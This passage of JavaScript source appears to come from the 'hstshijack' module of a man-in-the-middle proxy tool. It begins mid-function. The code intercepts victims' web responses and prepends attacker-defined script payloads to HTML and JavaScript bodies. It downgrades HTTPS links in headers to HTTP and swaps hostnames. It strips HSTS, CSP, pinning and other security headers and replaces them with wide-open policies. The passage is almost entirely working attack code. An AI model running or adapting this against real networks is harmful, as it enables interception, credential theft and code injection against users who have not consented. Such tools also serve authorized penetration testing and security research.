    }
  }

  /* Ignore this response if whitelisted. */
  if (whitelist[req.Client.IP]) {
    if (whitelist[req.Client.IP].indexOf(req.Hostname) != -1) {
      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset + ".");
      return;
    }
  } else {
    for (a = 0; a < ignore_hosts.length; a++) {
      var whole_regexp_set;
      if (ignore_hosts[a] != "*") {
        whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "");
      }

      if (
           ignore_hosts[a] == "*"
        || req.Hostname.match(whole_regexp_set[0])
      ) {
        ignored = true;

        /* Don't ignore response if there's a replacement for the requested host. */
        for (b = 0; b < target_hosts.length; b++) {
          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");
          if (req.Hostname.match(whole_regexp_set[0])) {
            ignored = false;
            break;
          }
        }

        /* Don't ignore response if there's a custom payload for the requested host. */
        if (ignored) {
          for (b = 0; b < Object.keys(payloads).length; b++) {
            payload_target_host = Object.keys(payloads)[b];
            if (payload_target_host != "*") {
              whole_regexp_set = toWholeRegexpSet(payload_target_host, "");
            }
            if (
                 payload_target_host == "*"
              || req.Hostname.match(whole_regexp_set[0])
            ) {
              ignored = false;
              break;
            }
          }
        }

        if (ignored) {
          log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");
          return;
        }
      }
    }

    /* Spoof markup bodies. */
    if (
         res.ContentType.match(/text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)|\S+[/]\S+[+]xml/i)
      || req.Path.match(/[.](?:html|htm|xml|xhtml|xhtm|xht|hta)$/i)
    ) {
      res.ReadBody();

      /* Prevent meta tag induced CSP restrictions. */
      res.Body = res.Body.replace(
        / http-equiv=['"]?Content-Security-Policy['"]?([ />])/ig,
        "$1");

      /* Block scripts. */
      for (a = 0; a < block_script_hosts.length; a++) {
        if (
             block_script_hosts[a] === "*"
          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
        ) {
          res.Body = res.Body.replace(/<script(\s|>)/ig, "<div style=\"display:none;\"$1");
          res.Body = res.Body.replace(/<\/script(\s|>)/ig, "</div$1");
          log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");
          break;
        }
      }

      /* Inject payloads. */
      injection = "";
      for (a = 0; a < Object.keys(payloads).length; a++) {
        injecting_host = Object.keys(payloads)[a];
        if (
             injecting_host == "*"
          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
        ) {
          injection = injection + payloads[injecting_host];
        }
      }
      if (injection != "") {
        res.Body = 
          "<script>\n" +
          payload_container_prefix + injection + payload_container_suffix +
          "</script>\n" +
          res.Body;
        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
      }
    }

    /* Spoof JavaScript bodies. */
    if (
         res.ContentType.match(/\S+[/]javascript/i)
      || req.Path.match(/[.]js$/i)
    ) {
      res.ReadBody();

      /* Block scripts. */
      for (a = 0; a < block_script_hosts.length; a++) {
        if (
             block_script_hosts[a] === "*"
          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
        ) {
          res.Body = "";
          log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
          break;
        }
      }

      /* Inject payloads. */
      injection = "";
      for (a = 0; a < Object.keys(payloads).length; a++) {
        injecting_host = Object.keys(payloads)[a];
        if (
             injecting_host == "*"
          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
        ) {
          injection = injection + payloads[injecting_host];
        }
      }
      if (injection != "") {
        res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
      }
    }

    /* Strip SSL from location headers. */
    res.Headers = res.Headers
      .replace(/(http)s:/ig, "$1:")
      .replace(/:443($|[^0-9])/g, "$1");

    /* Spoof hosts in headers. */
    for (a = 0; a < target_hosts.length; a++) {
      regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
      res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1]);
    }

    /* Remove security headers. */
    res.RemoveHeader("Strict-Transport-Security");
    res.RemoveHeader("Content-Security-Policy-Report-Only");
    res.RemoveHeader("Public-Key-Pins");
    res.RemoveHeader("Public-Key-Pins-Report-Only");
    res.RemoveHeader("X-Frame-Options");
    res.RemoveHeader("X-Content-Type-Options");
    res.RemoveHeader("X-Download-Options");
    res.RemoveHeader("X-Permitted-Cross-Domain-Policies");
    res.RemoveHeader("X-XSS-Protection");
    res.RemoveHeader("Expect-Ct");

    /* Set insecure headers. */
    res.SetHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: 'unsafe-inline'; object-src * data: blob: 'unsafe-inline'; style-src * data: blob: 'unsafe-inline'; report-uri x");
    res.SetHeader("X-WebKit-CSP", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: 'unsafe-inline'; object-src * data: blob: 'unsafe-inline'; style-src * data: blob: 'unsafe-inline'; report-uri x");
    res.SetHeader("X-Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: 'unsafe-inline'; object-src * data: blob: 'unsafe-inline'; style-src * data: blob: 'unsafe-inline'; report-uri x");
    res.SetHeader("Access-Control-Allow-Origin", "*");
    res.SetHeader("Access-Control-Allow-Methods", "*");
    res.SetHeader("Access-Control-Allow-Headers", "*");
    res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT");
    res.SetHeader("Pragma", "no-cache");
  }
}

